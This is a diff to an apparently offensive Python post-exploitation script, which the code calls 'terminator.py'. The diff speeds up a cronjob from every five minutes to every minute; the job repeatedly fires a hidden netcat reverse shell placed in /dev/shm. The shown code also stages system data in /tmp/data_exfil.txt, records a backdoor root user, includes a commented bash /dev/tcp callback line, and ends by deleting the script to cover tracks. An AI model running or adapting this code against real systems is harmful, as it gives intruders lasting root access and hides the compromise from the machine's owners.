@@ -635,14 +635,16 @@ def callback(local_ip, local_port):
    #os.system("echo 'bash -i >& /dev/tcp/{}/{} 0>&1' > /dev/shm/.data/data-log".format(local_ip,local_port))
 
 
-# create cronjob for executing callback script every 5 min
+# create cronjob for executing callback script every min
 def cron_make():
    print("\n### creating cronjob to execute callback every 5 min... ###")
    os.system("crontab -l > /tmp/mycron")
-   os.system("echo '5 * * * * /dev/shm/.data/data_log >/dev/null 2>&1' >> /tmp/mycron")
-   os.system("'' >> /tmp/mycron")
+   os.system("echo '* * * * * /dev/shm/.data/data_log >/dev/null 2>&1' >> /tmp/mycron")
+   os.system("'#' >> /tmp/mycron")
+   os.system("' ' >> /tmp/mycron")
    os.system("crontab /tmp/mycron")
    os.system("rm -f /tmp/mycron")
+   os.system("echo '1' | select-editor")
    os.system("systemctl restart cron")
    print("\n### cronjob created ###")
 
@@ -662,7 +664,7 @@ def extract(username,password,local_ip,local_port):
    os.system("echo '### persistence established with the following ###' >> /tmp/data_exfil.txt")
    os.system("echo 'user {}:{} was added with root privileges...to be able to ssh into new user, 'su {}' then run 'ssh-keygen' command to create ssh keys' >> /tmp/data_exfil.txt".format(username,password,username))
    os.system("echo 'nc reverse shell callback implanted at /dev/shm/.data/data_log' >> /tmp/data_exfil.txt")
-   os.system("echo 'cronjob created to execute nc reverse shell callback every 5 minutes to {}:{}' >> /tmp/data_exfil.txt".format(local_ip,local_port))
+   os.system("echo 'cronjob created to execute nc reverse shell callback every minute to {}:{}' >> /tmp/data_exfil.txt".format(local_ip,local_port))
 
    # get system info and write to data file
    os.system("echo '' >> /tmp/data_exfil.txt")
@@ -792,8 +794,9 @@ def clear_tracks(username,password,local_ip,local_port):
    print("\n### if elevated user does not have these permissions, try the privesc technique manually ###")
    print("\n- user {}:{} was added with root privileges".format(username,password))
    print("\n- nc reverse shell callback implanted at /dev/shm/.data/data_log")
-   print("\n- cronjob created to execute nc reverse shell callback every 5 minutes to {}:{}".format(local_ip,local_port))
+   print("\n- cronjob created to execute nc reverse shell callback every minute to {}:{}".format(local_ip,local_port))
    print("\n-- to catch shell run 'nc -nlvp {}' on local machine\n".format(local_port))
+   print("\n-- if cronjob is not working, you might need to run 'crontab -e' add a space under the cronjob, then exit the file with 'Ctrl+x','y','enter' --")
 
    # delete terminator.py file
    os.system("rm -f terminator.py")
